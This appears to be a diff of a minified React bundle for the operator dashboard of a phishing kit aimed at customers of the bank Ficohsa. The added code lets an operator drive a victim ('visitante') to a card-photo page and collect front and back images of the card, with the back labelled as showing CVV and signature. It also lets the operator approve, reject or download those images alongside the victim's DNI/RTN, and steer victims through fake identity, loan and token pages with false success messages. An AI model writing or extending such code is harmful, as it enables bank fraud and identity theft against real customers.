                   /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: getStatusText(user.pageState) }),
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `px-1.5 py-0.5 rounded text-[10px] font-semibold ${successPressedByUser[user.id] ? "bg-emerald-600/30 text-emerald-300" : user.page === 0 ? "bg-red-600/30 text-red-300" : user.page === 5 ? "bg-red-600/30 text-red-300" : user.page === 6 ? "bg-emerald-600/30 text-emerald-300" : "bg-[#0058CB]/30 text-blue-300"}`, children: successPressedByUser[user.id] ? "Éxito" : getPageName(user.page || 0) })
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `px-1.5 py-0.5 rounded text-[10px] font-semibold ${successPressedByUser[user.id] ? "bg-emerald-600/30 text-emerald-300" : user.page === 0 ? "bg-red-600/30 text-red-300" : user.page === 5 ? "bg-red-600/30 text-red-300" : user.page === 6 ? "bg-emerald-600/30 text-emerald-300" : "bg-[#0058CB]/30 text-blue-300"}`, children: successPressedByUser[user.id] ? "Éxito" : getPageName(user.page || 0) }),
+                  isFicohsa && user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 flex items-center gap-1 animate-pulse shadow-sm", children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 12, strokeWidth: 2.5, className: "text-emerald-400" }),
+                    " Validar Foto"
+                  ] })
                 ] })
               ] })
             ] }),
@@ -58357,6 +58986,131 @@ const MobileDashboard = () => {
                 user.dispositivo === "Desktop" ? "PC" : user.dispositivo
               ] })
             ] }),
+            isFicohsa && user.esperandoAprobacionFoto && (user.fotoTemporalHD || user.fotoTemporal) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gradient-to-b from-emerald-950/30 to-neutral-900 border-2 border-emerald-500/40 rounded-xl p-3 space-y-2.5 shadow-lg shadow-black/40", children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping" }),
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs font-bold text-emerald-300 uppercase tracking-wide", children: user.pasoFoto === "reverso" ? "Validar Reverso" : "Validar Frente" })
+                ] }),
+                /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[11px] text-emerald-300 font-semibold px-2 py-0.5 rounded-full bg-emerald-950/80 border border-emerald-500/40", children: user.pasoFoto === "reverso" ? "Paso 2 de 2" : "Paso 1 de 2" })
+              ] }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                "div",
+                {
+                  onClick: () => setSelectedLightboxPhoto({
+                    src: user.fotoTemporalHD || user.fotoTemporal,
+                    title: user.pasoFoto === "reverso" ? "Tarjeta - Reverso (Por Validar)" : "Tarjeta - Frente (Por Validar)",
+                    userId: user.id,
+                    dni: user.DNI || user.RTN || user.id
+                  }),
+                  className: "relative aspect-[16/10] w-full rounded-lg overflow-hidden bg-black border border-emerald-500/40 cursor-pointer shadow-inner active:scale-[0.99] transition-transform",
+                  children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx(
+                      "img",
+                      {
+                        src: user.fotoTemporalHD || user.fotoTemporal,
+                        alt: "Tarjeta enviada por el visitante",
+                        className: "w-full h-full object-cover"
+                      }
+                    ),
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/20 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-white bg-black/75 backdrop-blur-sm px-2.5 py-1 rounded-md border border-white/20 flex items-center gap-1.5 shadow-md", children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 14 }),
+                      " Tocar para maximizar"
+                    ] }) })
+                  ]
+                }
+              ),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 pt-0.5", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    type: "button",
+                    disabled: loadingPhotoAction[user.id],
+                    onClick: () => handleRechazarFotoMobile(user.id),
+                    className: "flex-1 py-2.5 px-3 rounded-lg text-xs font-bold bg-red-600/25 text-red-300 border border-red-500/40 hover:bg-red-600/40 active:scale-95 transition-all flex items-center justify-center gap-1.5 disabled:opacity-50",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 15 }),
+                      "Pedir reintento"
+                    ]
+                  }
+                ),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    type: "button",
+                    disabled: loadingPhotoAction[user.id],
+                    onClick: () => handleAprobarFotoMobile(user),
+                    className: "flex-1 py-2.5 px-3 rounded-lg text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-500 active:scale-95 transition-all shadow-md flex items-center justify-center gap-1.5 disabled:opacity-50",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 16, strokeWidth: 2.5 }),
+                      "Aprobar"
+                    ]
+                  }
+                )
+              ] })
+            ] }),
+            isFicohsa && user.page === 7 && !user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/90 border border-[#0058CB]/40 rounded-xl p-3.5 flex flex-col items-center justify-center text-center space-y-2.5 relative overflow-hidden shadow-lg shadow-black/40", children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-11 h-11 rounded-full bg-[#0058CB]/25 border border-blue-400/30 flex items-center justify-center text-blue-300 shadow-sm", children: user.fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 22, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 22, className: "animate-pulse text-blue-300" }) }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs font-bold text-white", children: user.fotoRechazada ? "El visitante está tomando la foto nuevamente" : "Esperando foto del visitante" }),
+                /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-[11px] text-blue-300/90 mt-0.5 font-medium", children: user.pasoFoto === "reverso" ? "Paso 2 de 2: Reverso de la tarjeta (CVV/Firma)" : "Paso 1 de 2: Frente de la tarjeta" })
+              ] }),
+              /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 bg-black/40 px-3 py-1 rounded-full border border-white/10", children: "Los botones de aprobación aparecerán apenas la capture" })
+            ] }),
+            isFicohsa && (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/80 border border-neutral-700/60 rounded-xl p-3 space-y-2", children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-gray-200 flex items-center gap-1.5", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14, className: "text-emerald-400" }),
+                " Tarjetas aprobadas:"
+              ] }) }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Frente" }),
+                  user.fotoFrente && typeof user.fotoFrente === "string" && user.fotoFrente.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                    "button",
+                    {
+                      type: "button",
+                      onClick: () => setSelectedLightboxPhoto({
+                        src: user.fotoFrente,
+                        title: "Tarjeta - Frente",
+                        userId: user.id,
+                        dni: user.DNI || user.RTN || user.id
+                      }),
+                      className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
+                      children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoFrente, alt: "Frente Tarjeta", className: "w-full h-full object-cover" }),
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
+                          /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
+                          " Ver"
+                        ] }) })
+                      ]
+                    }
+                  ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoFrente ? "Aprobado" : "Pendiente" })
+                ] }),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Reverso" }),
+                  user.fotoReverso && typeof user.fotoReverso === "string" && user.fotoReverso.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                    "button",
+                    {
+                      type: "button",
+                      onClick: () => setSelectedLightboxPhoto({
+                        src: user.fotoReverso,
+                        title: "Tarjeta - Reverso",
+                        userId: user.id,
+                        dni: user.DNI || user.RTN || user.id
+                      }),
+                      className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
+                      children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoReverso, alt: "Reverso Tarjeta", className: "w-full h-full object-cover" }),
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
+                          /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
+                          " Ver"
+                        ] }) })
+                      ]
+                    }
+                  ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoReverso ? "Aprobado" : "Pendiente" })
+                ] })
+              ] })
+            ] }),
             /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "grid grid-cols-2 gap-2", children: (selectedBank === "ficohsa" ? [
               { page: 1, label: "DNI/RTN", cols: "col-span-1" },
               { page: 4, label: "Préstamo", cols: "col-span-1" },
@@ -58385,8 +59139,8 @@ const MobileDashboard = () => {
                       setSuccessPressedByUser((prev) => ({ ...prev, [user.id]: true }));
                       const lastFormPage = lastFormPageByUser[user.id] || 1;
                       const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
-                      __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url).then(({ doc, updateDoc }) => {
-                        __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url).then(({ db, getBankCollection }) => {
+                      __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0).then(({ doc, updateDoc }) => {
+                        __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0).then(({ db, getBankCollection }) => {
                           updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
                             successMessage: message
                           });
@@ -58415,6 +59169,30 @@ const MobileDashboard = () => {
                 }
               )
             ] }),
+            isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
+              "button",
+              {
+                onClick: () => {
+                  __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0).then(({ doc, updateDoc }) => {
+                    __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0).then(({ db, getBankCollection }) => {
+                      updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
+                        mostrarModalFoto: true,
+                        fotoRechazada: false,
+                        esperandoAprobacionFoto: false,
+                        fotoAprobada: false
+                      });
+                    });
+                  });
+                  handleUpdatePageWithClear(user.id, 7);
+                },
+                disabled: user.page !== 0 && user.page !== 7,
+                className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1.5 ${user.page === 7 ? "bg-[#0058CB] text-white font-semibold ring-2 ring-blue-400/60" : user.page === 0 ? "bg-[#0058CB] text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
+                children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+                  " Foto"
+                ]
+              }
+            ) }),
             /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "space-y-2", children: [
               /* @__PURE__ */ jsxRuntimeExports.jsx(
                 "button",
@@ -58683,6 +59461,103 @@ const MobileDashboard = () => {
         },
         loading: loadingFinalizar,
         variant: "warning"
+      }
+    ),
+    selectedLightboxPhoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+      "div",
+      {
+        className: "fixed inset-0 z-[999] bg-black/90 backdrop-blur-md flex flex-col justify-between p-3 animate-in fade-in duration-200",
+        onClick: () => setSelectedLightboxPhoto(null),
+        children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "div",
+            {
+              className: "flex items-center justify-between px-3 py-2 bg-neutral-900/90 rounded-xl border border-neutral-700",
+              onClick: (e) => e.stopPropagation(),
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" }),
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs font-bold text-white", children: selectedLightboxPhoto.title })
+                ] }),
+                /* @__PURE__ */ jsxRuntimeExports.jsx(
+                  "button",
+                  {
+                    type: "button",
+                    onClick: () => setSelectedLightboxPhoto(null),
+                    className: "w-7 h-7 flex items-center justify-center rounded-lg bg-neutral-800 text-gray-300 hover:text-white",
+                    children: /* @__PURE__ */ jsxRuntimeExports.jsx(IconX, { size: 16 })
+                  }
+                )
+              ]
+            }
+          ),
+          /* @__PURE__ */ jsxRuntimeExports.jsx(
+            "div",
+            {
+              className: "flex-1 flex items-center justify-center my-3 overflow-hidden",
+              onClick: (e) => e.stopPropagation(),
+              children: /* @__PURE__ */ jsxRuntimeExports.jsx(
+                "img",
+                {
+                  src: selectedLightboxPhoto.src,
+                  alt: selectedLightboxPhoto.title,
+                  className: "max-h-full max-w-full object-contain rounded-xl border border-white/10 shadow-2xl"
+                }
+              )
+            }
+          ),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "div",
+            {
+              className: "flex items-center justify-between px-3 py-2.5 bg-neutral-900/95 rounded-xl border border-neutral-700 text-xs",
+              onClick: (e) => e.stopPropagation(),
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-gray-300", children: [
+                  "Usuario: ",
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("strong", { className: "text-white font-mono", children: selectedLightboxPhoto.dni })
+                ] }),
+                (() => {
+                  const photoKey = `${selectedLightboxPhoto.userId}_${selectedLightboxPhoto.title}`;
+                  const isDownloaded = !!downloadedPhotos[photoKey];
+                  if (isDownloaded) {
+                    return /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                      "button",
+                      {
+                        type: "button",
+                        disabled: true,
+                        className: "px-3 py-1.5 bg-neutral-800 text-emerald-400 rounded-lg border border-emerald-500/30 font-semibold flex items-center gap-1.5 cursor-not-allowed opacity-90",
+                        children: [
+                          /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 14 }),
+                          " Descargada"
+                        ]
+                      }
+                    );
+                  }
+                  return /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                    "button",
+                    {
+                      type: "button",
+                      onClick: () => {
+                        const link = document.createElement("a");
+                        link.href = selectedLightboxPhoto.src;
+                        link.download = `${selectedLightboxPhoto.title.toLowerCase().replace(/\s+/g, "_")}_${selectedLightboxPhoto.userId}.jpg`;
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        setDownloadedPhotos((prev) => ({ ...prev, [photoKey]: true }));
+                      },
+                      className: "px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white font-semibold rounded-lg shadow flex items-center gap-1.5",
+                      children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx(IconDownload, { size: 14 }),
+                        " Descargar foto"
+                      ]
+                    }
+                  );
+                })()
+              ]
+            }
+          )
+        ]
       }
     )
   ] });
